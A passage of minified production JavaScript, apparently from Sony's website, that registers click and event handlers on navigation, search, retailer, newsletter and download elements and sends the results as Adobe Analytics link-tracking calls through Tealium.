e=!1;return"true"===_bsq.utils.docCookies.getItem(_bsq.aa.devUnsupporteBrowser)&&""===_bsq.utils.docCookies.getItem(__bsq.aa.unSupportedBrowserFlag)&&_bsq.utils.docCookies.setItem(_bsq.aa.unSupportedBrowserFlag,"true")&&(e=!0),e},_bsq.aa.all_overlayModule=function(){var e=!1;return"true"===_bsq.utils.docCookies.getItem(_bsq.aa.devOverlayModule)&&""===_bsq.utils.docCookies.getItem(_bsq.aa.overlayModuleFlag)&&_bsq.utils.docCookies.setItem(_bsq.aa.overlayModuleFlag,"true")&&(e=!0),e},_bsq.aa.all_headerFooterClick=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(_bsq.utils.on(document,"click",".brand.sprite-32a-sony-logo",(function(){n("sony")})),_bsq.utils.on(document,"click",".nav-li-store a",(function(){n("header_menu_store")})),_bsq.utils.on(document,"click",".nav-li-support a",(function(){n("header_menu_support")})),_bsq.utils.on(document,"click",".btn-login",(function(){n("sign_in")})),_bsq.utils.on(document,"click",".navmenu-li-cart a, .nav-li-cart a, a.btn-mobile-cart",(function(){n("cart")})),_bsq.utils.on(document,"click",".navmenu-line a",(function(){this.querySelectorAll(".fonticon-10-account").length>0?n("account_information"):this.querySelectorAll(".fonticon-10-orders").length>0?n("orders"):this.querySelectorAll(".fonticon-10-newsletter").length>0?n("newsletters"):this.querySelectorAll(".fonticon-10-registered").length>0&&/^\/store\/my-account\/orders/i.test(this.pathname)?n("my_orders"):this.querySelectorAll(".fonticon-10-registered").length>0&&/^\/store\/my-account\/address-book/i.test(this.pathname)?n("delivery_address"):this.querySelectorAll(".fonticon-10-registered").length>0&&/^\/store\/my-account\/payment-details/i.test(this.pathname)?n("payment_details"):this.querySelectorAll(".fonticon-10-registered").length>0&&null!=this.parentElement&&null!=this.parentElement.previousElementSibling&&this.parentElement.previousElementSibling.querySelectorAll(".fonticon-10-registered").length>0||/^\/mysony\/product\/register/i.test(this.pathname)?n("register_a_new_product"):this.querySelectorAll(".fonticon-10-registered").length>0?n("my_products"):this.querySelectorAll(".fonticon-10-favorite").length>0?n("favorites"):this.querySelectorAll(".fonticon-10-support").length>0&&n("my_community")})),_bsq.utils.on(document,"click",".btn-logout",(function(){n("sign_out")})),_bsq.utils.on(document,"submit",".navmenu-search-section-input",(function(){n("search")})),document.querySelectorAll("#type-ahead-result-container").length>0&&_bsq.utils.on("#type-ahead-result-container","click",".navmenu-search-results .search-result-line a",(function(){var e=[].slice.call(document.querySelectorAll(".navmenu-search-results .search-result-line a")).indexOf(this)+1;n("header_search_result_"+e),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,document.querySelector("#nav-search-input").value)})),document.querySelector("#type-ahead-result-container")&&_bsq.utils.on("#type-ahead-result-container","click",".navmenu-search-suggestions .search-suggestion-line a",(function(){var e=[].slice.call(document.querySelectorAll(".navmenu-search-suggestions .search-suggestion-line a")).indexOf(this)+1;n("header_search_suggestion_"+e),_bsq.utils.docCookies.setItem(_bsq.aa.typeaheadTermCookieName,document.querySelector("#nav-search-input").value)})),_bsq.utils.on(document,"click",".navmenu-li-favorites a, .nav-li-favorites a",(function(){n("favorites")})),_bsq.utils.on(document,"click","#navtrayPlaystation .navtray-li-PlayStation a, #navtrayPlaystation .navtray-li-PlayStation a, #navtrayPlaystation .navtray-li-PlayStation a, .nav-li-playstation a, .navtray-li-PlayStation a",(function(){n("header_menu_playstation")})),_bsq.utils.on(document,"click",".footer-change-location-link",(function(){n("store_locations")})),_bsq.utils.on(document,"click",".footer-store-locator-form",(function(){n("search_stores")})),_bsq.utils.on(document,"click",".footer-link-li .primary-link",(function(){var e=[].slice.call(document.querySelectorAll(".footer-link-li .primary-link")).indexOf(this)+1;n("footer_links_"+e)})),document.querySelector("#currentCountry")&&document.querySelector("#currentCountry").addEventListener("click",(function(e){n("country_selector")})),_bsq.utils.on(document,"click",".footer-contact .primary-link",(function(){var e=[].slice.call(document.querySelectorAll(".footer-contact .primary-link")).indexOf(this)+1;n("contact_link_"+e)})),_bsq.utils.on(document,"click",".footer-social-pinterest",(function(){n("pinterest")})),_bsq.utils.on(document,"click",".footer-social-twitter",(function(){n("twitter")})),_bsq.utils.on(document,"click",".footer-social-youtube",(function(){n("youtube")})),_bsq.utils.on(document,"click",".footer-social-gplus",(function(){n("google_plus")})),_bsq.utils.on(document,"click",".footer-social-facebook",(function(){n("facebook")})),_bsq.utils.on(document,"click",".footer-legal-links a",(function(e){var t=[].slice.call(document.querySelectorAll(".footer-legal-links a")).indexOf(this)+1;n("legal_link_"+t)})))},_bsq.aa.all_navigationClick=function(e){if(void 0!==e&&"undefined"!=typeof jQuery)try{jQuery("body").on("click",".navtray#navtrayElectronics .navtray-section-main a",(function(){jQuery(this).parent("li").length>0&&jQuery(this).parent("li")[0].className.indexOf("navtray-li navtray-li-")>-1&&s(jQuery(this).parent("li")[0].className.replace("navtray-li navtray-li-","").replace("navtray-li-small","").trim()),this.className.indexOf("navmenu-style-tl nav-view-all-tl")>-1&&s("all-electronics")})),jQuery("body").on("click",".mega-menu-wrapper a[data-category-name]",(function(){s("mn|"+jQuery(this).data("category-name"))})),jQuery("body").on("touchstart mousedown","#navMobileScroller .mega-menu-wrapper .mega-nav-subcategory a[data-category-name], #navMobileScroller .mega-menu-wrapper .mega-nav-second-level-link a[data-category-name]",(function(e){("mousedown"===e.type&&1===e.which||"touchstart"===e.type)&&s("mn|"+jQuery(this).data("category-name"))})),jQuery("body").on("touchstart mousedown",".mega-menu-wrapper a.bottom-link--all-products",(function(e){("mousedown"===e.type&&1===e.which||"touchstart"===e.type)&&s("mn|all-electronics")})),jQuery("body").on("click",".navtray#navtrayElectronics .navtray-section-featured a",(function(){s("electronics_link_"+(jQuery(".navtray#navtrayElectronics .navtray-section-featured a").index(this)+1))})),jQuery("body").on("click",".navtray#navtrayEntertainment .navtray-section-main a",(function(){jQuery(this).parent("li").length>0&&(jQuery(this).parent("li")[0].className.indexOf("navtray-li navtray-li-")>-1?s(jQuery(this).parent("li")[0].className.replace("navtray-li navtray-li-","").replace("","")):void 0!==jQuery(this).attr("aria-label")&&s(jQuery(this).attr("aria-label")))})),jQuery(".navtray#navtrayEntertainment .navtray-section-featured a").click((function(){s("entertainment_link_"+(jQuery(".navtray#navtrayEntertainment .navtray-section-featured a").index(this)+1))})),jQuery("body").on("click",".navtray#navtraySupport .navtray-section-main a",(function(){var e=["customer support","my sony","sony community"][jQuery(".navtray#navtraySupport .navtray-list-main li a").index(this)]||"";""===e&&(e=jQuery(this).attr("aria-label"));var t=!1;(location.hostname.match(/(www.)?sony\.(com|ca)/)||void 0!==u&&void 0!==u.page&&void 0!==u.page.country&&~["US","CA"].indexOf(u.page.country))&&e.toLowerCase().match(/support|community/)&&(utag_data.aaLinkTrackVars="pageName,events,prop21,prop22,prop33,prop34,prop35,prop36,prop40,eVar21,eVar22,eVar47,eVar45,eVar5,prop6,eVar9,eVar29,list2",utag_data.aaLinkTrackEvents="",utag_data.aaNavigationLinkCookie=e,utag_data.aaLinkType="o",utag_data.aaLinkName="NA: Navigation Support drop down clicks",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()),t=!0),t||s(e)})),jQuery(".navtray#navtraySupport .navtray-section-featured a").click((function(){s("support_link_"+(jQuery(".navtray#navtraySupport .navtray-section-featured a").index(this)+1))})),"category"===e&&(void 0!==jQuery().on&&jQuery("body").on("click","section .subnav-product-grid a",(function(){var e=0;jQuery(".subnav-tray .subcategory").each((function(){e=0,jQuery(this).find(".subnav-product-grid a").each((function(){e+=1,jQuery(this).data("banner_index",e)}))})),s("subcategory_"+jQuery(this).closest('section[id*="subcategory-tlnav"]').attr("id").replace("subcategory-tlnav_","")+"_"+jQuery(this).data("banner_index"))})),jQuery(".subnav-nav-carousel-wrapper .subcategory-link").not(".has-products").click((function(){var e=0;void 0!==this&&(e=jQuery(this).index()+1),s("category_link_"+e)})))}catch(e){}},_bsq.aa.gallery_FilterSortingTracking=function(){"undefined"!=typeof jQuery&&jQuery(document).ready((function(){setTimeout((function(){v()}),1e3),setTimeout((function(){f()}),1e3),jQuery("[data-filter-type]").on("mouseup",(function(){setTimeout((function(){v()}),1e3)})),void 0!==jQuery().on&&jQuery(".active-filters-wrap").on("mouseup","em,span",(function(){setTimeout((function(){v()}),1e3)})),jQuery(".sort-options .native-dropdown").is(":visible")?jQuery(".sort-options select#select-sort-by").on("change",(function(){f(jQuery(this).find("option:selected").data("analytics-text"))})):jQuery(".sort-options .dropdown.dropdown-alt").is(":visible")&&jQuery(".sort-options ul li a").on("mouseup",(function(){f(jQuery(this).data("analytics-text"))}))}))},_bsq.aa.gallery_trackAccessoryFinderTyped=function(){var e=function(e){if("undefined"!=typeof jQuery){var t="accessory finder";void 0!==e.currentTarget.className&&("box-close"===e.currentTarget.className?t+=" close":t+=" product click");var a=jQuery("#accessory-finder-input").val().substring(0,100);""===a&&(a="no search term"),void 0!==a&&(utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar44",utag_data.aaLinkTrackEvents="",utag_data.aaAccessoryFinderSearchTerm=a,utag_data.aaLinkType="o",utag_data.aaLinkName=t,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))}};"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery(".gallery-content").off("click",".accessory-finder-modal a.compat-item, .accessory-finder-modal .box-close",e),jQuery(".gallery-content").on("click",".accessory-finder-modal a.compat-item, .accessory-finder-modal .box-close",e))},_bsq.aa.all_ProductAddToFavorites=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").off("favorite","span.favorite-holder"),jQuery("body").on("favorite","span.favorite-holder",(function(){utag_data.aaLinkTrackVars="pageName,events,products,prop21,prop22,prop33,prop34,prop35,prop36,prop40,eVar21,eVar22,eVar47,eVar45,eVar5,prop6,eVar9,list2",utag_data.aaLinkTrackEvents="event20",utag_data.aaEvents.push("event20"),void 0!==jQuery(this).data("product-name")&&(utag_data.aaProducts=[jQuery(this).data("product-name")]),utag_data.aaLinkType="o",utag_data.aaLinkName="Favorite button click",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())})))},_bsq.aa.trackViewSwitchButtonClick=function(){"undefined"!=typeof jQuery&&(jQuery("body").on("click","[data-target*='-gallery-detailed']",(function(){s("grid_view_button")})),jQuery("body").on("click","[data-target*='-gallery-compare']",(function(){s("compare_view_button")})))},_bsq.aa.module_interactionListerner=function(){if("undefined"!=typeof jQuery){var e=function(e){var t="";void 0!==e&&void 0!==e.additionalVariables&&(t=","+e.additionalVariables),utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58,eVar70"+t,utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,void 0!==e&&void 0!==e.clickedElement&&void 0!==e.clickedElementType&&(utag_data.aaInteractionType=e.clickedElement,utag_data.aaLinkType="o",utag_data.aaLinkName=e.clickedElementType,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray()))};void 0!==jQuery().on&&(jQuery("body").off("moduleInteraction",e),jQuery("body").on("moduleInteraction",e))}},_bsq.aa.pdp_trackSocialLinkClicks=function(e,t){var a=t.toUpperCase(),o={pageName:e,pageTemaplate:a},i=function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19");utag_data.aaPageName.trim();utag_data.aaInteractionType="Module interaction - PDP social click: "+e.clickedElement,utag_data.aaLinkType="o",utag_data.aaLinkName=a+" "+e.masterName,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())};"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").off("social_link_click",null,o,i),jQuery("body").on("social_link_click",null,o,i))},_bsq.aa.pdp_userfeedback=function(){if("undefined"!=typeof jQuery){jQuery("body").on("userfeedback_submitted",(function(e){var t;t=e.clickedElement||"",utag_data.aaLinkTrackVars="pageName,prop23,prop21,prop22,prop6,prop7,prop32,prop34,prop35,prop36,prop25,eVar27",utag_data.aaLinkTrackVars+=",eVar20,eVar21,eVar22,prop40,eVar7,eVar6,eVar47,eVar55,eVar46,eVar45,eVar5,eVar19,eVar54,prop6,eVar9,list2",utag_data.aaFeedbackModule=t,utag_data.aaLinkType="o",utag_data.aaLinkName="Feedback",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))}},_bsq.aa.pdp_review_submit=function(){if("undefined"!=typeof jQuery&&void 0!==jQuery().on){jQuery(document).on("WriteAReviewLink:clicked",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaPageName.trim(),utag_data.aaInteractionType="Module interaction - Write review: "+utag_data.aaPageTemplate,utag_data.aaLinkType="o",utag_data.aaLinkName="Write review",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))}},_bsq.aa.search_trackClicks=function(){var e=function(e){utag_data.aaLinkTrackVars="pageName,events,prop42",_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:Internal search results - Organic"),utag_data.aaLinkTrackEvents="event39",utag_data.aaClickedSearchResultPosition=e.clickedElement.replace(" | ",":"),utag_data.aaClickedSearchResultPosition+=":organic",utag_data.aaEvents.push("event39");var t=e.clickedLinkURL||"";_bsq.aa.spt_sisterCompanies(sgwn,t,["prop61"]),utag_data.aaLinkType="o",utag_data.aaLinkName="Search result click",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())},t=function(e){utag_data.aaLinkTrackVars="pageName,events,prop42",_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:Internal search results - Recommendation"),utag_data.aaLinkTrackEvents="event39",utag_data.aaClickedSearchResultPosition=e.clickedElement.replace(" | ",":"),utag_data.aaClickedSearchResultPosition+=":recommendation",utag_data.aaEvents.push("event39"),utag_data.aaLinkType="o",utag_data.aaLinkName="Search result click",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())};"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").off("searchResultClick",null,e),jQuery("body").on("searchResultClick",null,e)),"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").off("recommendationSearchResultClick",null,t),jQuery("body").on("recommendationSearchResultClick",null,t))},_bsq.aa.spt_sisterCompanies=function(e,t,a){for(var o=!1,i=["alphapro.sony.ru"],r=0;r<i.length;r++)!1===o&&document.URL.toLowerCase().indexOf(i[r].toLowerCase())>-1&&(o=!0);if(!o)for(r=0;r<_bsq.aa.sisterCompanyURLs.length;r++)if(1===_bsq.aa.sisterCompanyURLs[r].useRegex&&new RegExp(_bsq.aa.sisterCompanyURLs[r].url).test(t)||0===_bsq.aa.sisterCompanyURLs[r].useRegex&&t.indexOf(_bsq.aa.sisterCompanyURLs[r].url.toLowerCase())>-1){var n="";void 0!==a&&""!==a&&null!==a&&""!==(n=a.join(","))&&(n=","+n),e.linkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,prop28,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar9,list2"+n,e.linkTrackEvents=""===e.linkTrackEvents||void 0===e.linkTrackEvents?"event8":e.linkTrackEvents+",event8",e.events=""===e.events||void 0===e.events?"event8":e.events+",event8",e.prop28=_bsq.aa.sisterCompanyURLs[r].companyName,t.toLowerCase().indexOf("cpint=")>-1&&""!==_bsq.utils.getQueryParameter(t.toLowerCase(),"cpint")&&(e.prop40=_bsq.utils.getQueryParameter(t.toLowerCase(),"cpint"),e.eVar95=e.eVar96=e.eVar97=e.eVar98=e.eVar99=e.eVar100="D=c40",e.linkTrackVars+=",eVar95,eVar96,eVar97,eVar98,eVar99,eVar100,prop40"),t.toLowerCase().indexOf("cid=")>-1&&""!==_bsq.utils.getQueryParameter(t.toLowerCase(),"cid")&&(e.campaign=_bsq.utils.getQueryParameter(t.toLowerCase(),"cid"),e.eVar90=e.eVar91=e.eVar92=e.eVar93=e.eVar94=e.prop39="D=v0",e.linkTrackVars+=",campaign,eVar90,eVar91,eVar92,eVar93,eVar94,prop39"),""===a&&(e.linkType="o",e.linkName="Sony site referral: "+e.prop28,_bsq.aa.removeVariablesFrom.linkTrackVars.push("prop28"),_bsq.aa.removeVariablesFrom.linkTrackEvents.push("event8"))}},_bsq.aa.search_trackLoadMoreClicks=function(){var e=function(e){utag_data.aaLinkTrackVars="pageName,events,prop41,eVar10",utag_data.aaLinkTrackEvents="event37",utag_data.aaEvents.push("event37"),utag_data.aaLinkType="o",utag_data.aaLinkName=e.clickedElement,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())};"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").off("loadMoreSearchResults",e),jQuery("body").on("loadMoreSearchResults",e))},_bsq.aa.dealerServerCall=function(e,t,a,o,i){e=void 0!==e?e.toLowerCase():"",t=void 0===t?"":t,i=void 0!==i?i.toLowerCase():"",a=void 0===a?",eVar42":"",utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar70,products"+a,void 0!==utag_data.aaCountry&&"US"===utag_data.aaCountry&&(utag_data.aaLinkTrackVars=utag_data.aaLinkTrackVars+",prop38,prop37","undefined"!=typeof jQuery&&(utag_data.aaRetailersNumber=jQuery("div.ps-online-tab:visible div.ps-online-sellers div.ps-online-seller-select").length||jQuery('section[id^="curated_offers_"]').length||"")),utag_data.aaLinkTrackEvents="event31",utag_data.aaProducts=[t],utag_data.aaEvents.push("event31"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaRetailerName=e,(/^sonygwt-gwn-eu-(sit|prod)$/gi.test(_bsq.aa.all_getRSID(utag_data.aaCountry))||void 0!==utag_data.aaCountry&&"VN"===utag_data.aaCountry)&&(utag_data.aaInteractionType="transition_retailer-links | Module interaction - retailer click: "+e,utag_data.aaLinkTrackVars+=",prop6,eVar58",/^sonygwt-gwn-eu-(sit|prod)$/gi.test(_bsq.aa.all_getRSID(utag_data.aaCountry))&&(utag_data.aaRetailerClickDetails=i,utag_data.aaLinkTrackVars+=",eVar158"),utag_data.aaLinkTrackEvents+=",event19",utag_data.aaEvents.push("event19")),void 0!==utag_data.aaCountry&&/^(RU|KZ|UA)$/gi.test(utag_data.aaCountry)&&void 0!==o&&(utag_data.aaLinkTrackVars+=",eVar154",utag_data.aaLinkTrackEvents=utag_data.aaLinkTrackEvents+",event100",utag_data.aaRURetailerPrice=o.replace(/[^0-9]+/g,""),utag_data.aaEvents.push("event100"),utag_data.aaProducts=[t],utag_data.aaRegionalV154=_bsq.aa.getMostGranularProductID(u.product)),utag_data.aaLinkType="o",utag_data.aaLinkName="Retailer click - "+e,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())},_bsq.aa.dealerMapServerCall=function(e){e=void 0!==e?e.toLowerCase():"",utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,products,eVar42,eVar70",utag_data.aaLinkTrackEvents="event30",utag_data.aaEvents.push("event30"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaRetailerName=e,utag_data.aaLinkType="o",utag_data.aaLinkName="Dealer map click - "+e,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())},_bsq.aa.regional_USCADealerClick=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("click","#sony-main.wheretobuy a.buy, #sony-main.wheretobuy #ciq-buyonline .ciq-offers-table a.ciq-buy-now-button",(function(e){var t="",a=jQuery(this).attr("href")||"",o=jQuery(this).attr("target")||"";""!==a&&"_blank"!==o&&e.preventDefault();var i="";try{i=_bsq.utils.getQueryParameter(document.URL,"product")}catch(e){}try{t=jQuery(this).find("img").attr("alt")}catch(e){}t=void 0!==a&&-1===a.indexOf("www.shopgentec.ca")?null!=t?t.toLowerCase():"":"gentec",_bsq.aa.dealerServerCall(t,i),""!==a&&"_blank"!==o&&setTimeout((function(){var e;e=a,window.location=e}),1e3)}))},_bsq.aa.transition_EUMapDealerClick=function(){"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").on("click",".pgeDealerLocator #mapView .infoWindow.infoWindowDefaultSmall, .pgeDealerLocator #mapView .infoWindow.infoWindowDefault, .locatorTabsMapContainer#mapView .infoWindow.infoWindowDefaultSmall",(function(){var e="";try{e=jQuery(this).find(".icon").text()||""}catch(e){}_bsq.aa.dealerMapServerCall(e)})),jQuery("body").on("click","div.dl-app__inner--panel ul.dl-results__list a.dl-result__link, div.dl-map.embed div[title]",(function(e){var t="";try{t=jQuery(this).find("h3.dl-result__headline").text()||jQuery(this).attr("title")||""}catch(e){}_bsq.aa.dealerMapServerCall(t)})),jQuery("body").on("touchend",'section.dealer-locator-v2 div[title]:not("div.dl-default-markercluster")',(function(e){var t="";try{t=jQuery(this).attr("title")||""}catch(e){}_bsq.aa.dealerMapServerCall(t)})),jQuery("body").on("dealer_selected",(function(e,t){var a="";try{a=(t.dealerName||"")+"|"+(t.dealerId||"")+"["+t.dealerCity+"]"}catch(e){}_bsq.aa.dealerMapServerCall(a)})))},_bsq.aa.transition_GlobalTransitionDealerClick=function(){var e="";void 0!==u&&void 0!==u.transition&&void 0!==u.transition.selection&&(e=u.transition.selection.sku_id,u.transition.selection.model_id),"undefined"!=typeof jQuery&&void 0!==jQuery().on&&jQuery("body").on("retailerSelected",(function(t,a){var o="",i=void 0!==a&&void 0!==a.price?a.price:void 0;void 0!==a&&void 0!==a.name?o=a.name:void 0!==t&&void 0!==t.name&&(o=t.name);var r=(void 0!==a&&void 0!==a.index?a.index:"")+"|"+o+"|"+(void 0!==a&&void 0!==a.stockStatus?a.stockStatus:"");void 0===utag_data.aaCountry||"US"!==utag_data.aaCountry&&"CA"!==utag_data.aaCountry||void 0!==a?void 0!==utag_data.aaCountry&&"US"!==utag_data.aaCountry&&"CA"!==utag_data.aaCountry&&void 0!==a&&void 0!==a.name?_bsq.aa.dealerServerCall(o,e,void 0,i,r):void 0===utag_data.aaCountry||"US"!==utag_data.aaCountry&&"CA"!==utag_data.aaCountry||void 0===a||void 0===a.name||_bsq.aa.dealerServerCall(o,e,void 0,i):_bsq.aa.dealerServerCall(o,e)}))},_bsq.aa.oof_DealerClick=function(){document.addEventListener("retailerSelected",(function(e,t){var a;a=void 0!==e&&void 0!==e.detail?e.detail.name:"";var o=(void 0!==e&&void 0!==e.detail?e.detail.index:"")+"|"+a+"|";_bsq.aa.dealerServerCall(a,void 0,void 0,void 0,o)}))},_bsq.aa.transition_dealersNumber=function(e){var t="";return"undefined"!=typeof jQuery&&("CA"===e?t=jQuery("a[href*='.shopgentec.ca']").length:"US"!==e?jQuery(".online-retailers").length>0?t=jQuery(".online-retailers ul li").length:jQuery("ul.online-shops__list > li.online-shops__list-item").length>0?t=jQuery("ul.online-shops__list > li.online-shops__list-item").length:jQuery(".results a[href*='.sony.com/retailers']").length>0?t=0:jQuery(".ciq-offers-table").length>0?t=jQuery(".ciq-offers-table tr").length:jQuery(".lojas-online").length>0?t=jQuery(".lojas-carousel-ul li").length:jQuery(".image-module img[alt]").length>0?t=jQuery(".image-module img[alt]").length:1===jQuery("[data-mastername='transition_sku-selection']").length&&0===jQuery("[data-mastername='transition_retailer-links']").length&&(t=0):"US"===e&&(t="")),t},_bsq.aa.transition_EURetailersNames=function(){var e=[];return"undefined"!=typeof jQuery&&("undefined"!=typeof utag_data&&/^(RU|UA|KZ)$/gi.test(utag_data.aaCountry)?jQuery("ul.online-shops__list > li.online-shops__list-item").each((function(t,a){e.push(jQuery(a).find("div.shop-card__title").text().trim())})):(jQuery(".online-retailers-box li[data-name]").each((function(t){e.push(jQuery(this).data("name")||"")})),0==e.length&&jQuery(".image-module img[alt]").each((function(t,a){e.push(jQuery(this).attr("alt")||"")})))),e.join(",").toLowerCase()},_bsq.aa.transition_EURetailersUrl=function(){"undefined"!=typeof jQuery&&"transition"===utag_data.aaPageTemplate&&jQuery("[id^='online_retailers'] a.btn").each((function(e,t){if(/gethatch\.com/gi.test(jQuery(t).attr("href"))){var a=_bsq.utils.docCookies.getItem("gvo_cmp")||_bsq.utils.getQueryParameter(location.search,"cid",!0)||"no_id";if(jQuery(t).attr("href",jQuery(t).attr("href")+"&CID="+a+"&huid="+(Visitor.getInstance("7286403D53B6AA9A0A490D4C@AdobeOrg").getMarketingCloudVisitorID()||"no_id")),"no_id"!=a&&/amazon/gi.test(jQuery(t).closest("li").attr("data-name"))){var o=/^\d{5}/g.test(a)?a.substring(0,1)+"_":a.substring(0,a.indexOf("-"))+"_";jQuery(t).attr("href",jQuery(t).attr("href")+"&AID="+o)}}}))},_bsq.aa.transition_RURetailersPromotionClicks=function(){"undefined"!=typeof jQuery&&jQuery("body").on("clickPromotionDescription",(function(e,t){jQuery("body").trigger("retailerSelected",t)}))},_bsq.aa.oof_trackSocialLinkClicks=function(e,t){var a=t.toUpperCase(),o={pageName:e,pageTemaplate:a},i=function(e){utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar58,eVar70",utag_data.aaLinkTrackEvents="event19",utag_data.aaEvents.push("event19"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname;utag_data.aaPageName.trim();utag_data.aaInteractionType="E-Img-OOFM-UXApp-en_GL-2017-08-M10-moreinformation | Module Interaction - OOF social click: "+e.clickedElement,utag_data.aaLinkType="o",utag_data.aaLinkName=a+" "+e.masterName,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())};"undefined"!=typeof jQuery&&void 0!==jQuery().on&&(jQuery("body").off("social_link_click",null,o,i),jQuery("body").on("social_link_click",null,o,i))},_bsq.aa.sau_newsletterSubscription=function(){document.addEventListener("subscribed",(function(e){jQuery(".floating-prospect-box--success").length>0&&!window.floating_newsletter_subscribed?(window.floating_newsletter_subscribed=!0,utag_data.aaEmailSubscritpion="floating-form-box"):jQuery(".static-prospect-box--success").length>0&&!window.static_newsletter_subscribed&&(window.static_newsletter_subscribed=!0,utag_data.aaEmailSubscritpion="static-form-box"),utag_data.aaLinkTrackVars="pageName,events,prop10,prop23,prop21,prop22,prop9,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar24,eVar70",utag_data.aaLinkTrackEvents="event61",utag_data.aaEvents.push("event61"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="SAU newsletter subscription | "+utag_data.aaEmailSubscritpion,utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.prs_newsletterSubscription=function(){document.addEventListener("emailSubscribed",(function(e){utag_data.aaLinkTrackVars="pageName,events,prop7,prop10,prop23,prop21,prop22,prop9,eVar6,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,eVar24,eVar70",utag_data.aaLinkTrackEvents="event61",utag_data.aaEvents.push("event61"),utag_data.aaPageURL=_bsq.utils.all_maskPIIData(document.URL),utag_data.aaPageURLExclParams=window.location.protocol+"//"+window.location.host+window.location.pathname,utag_data.aaLinkType="o",utag_data.aaLinkName="PRS newsletter subscription | static-form-box",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.prs_searchResultClick=function(){document.addEventListener("clickedSearchResult",(function(e){_bsq.utils.docCookies.setItem(_bsq.aa.navigationLinkCookieName,"cl:Internal search results - Organic"),utag_data.aaClickedSearchResultPosition=e.detail.position+":"+_bsq.utils.all_maskPIIData(u.search.term)+":organic",utag_data.aaLinkTrackVars="pageName,events,prop42",utag_data.aaLinkTrackEvents="event39",utag_data.aaEvents.push("event39"),utag_data.aaLinkType="o",utag_data.aaLinkName="Search result click",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.prs_downloadAsset=function(){document.addEventListener("downloaded",(function(e){utag_data.aaDownloadName=e.detail.asset||"",utag_data.aaLinkTrackVars="pageName,products,events,prop10,prop23,prop21,prop22,prop9,prop48,prop49,eVar27,eVar20,eVar21,eVar22,eVar7,eVar5,prop46,eVar30,eVar57",utag_data.aaLinkTrackEvents="event4",utag_data.aaEvents.push("event4"),utag_data.aaLinkType="o",utag_data.aaLinkName="Press Centre - File download",utag.link(utag_data,(function(e){}),utag.ext.getAppMeasurementTagIDAsArray())}))},_bsq.aa.sau_alphaAcademyTutorials=function(){utag_data.aaRegionalC59=document.querySelectorAll(".alpha-academy-video-training 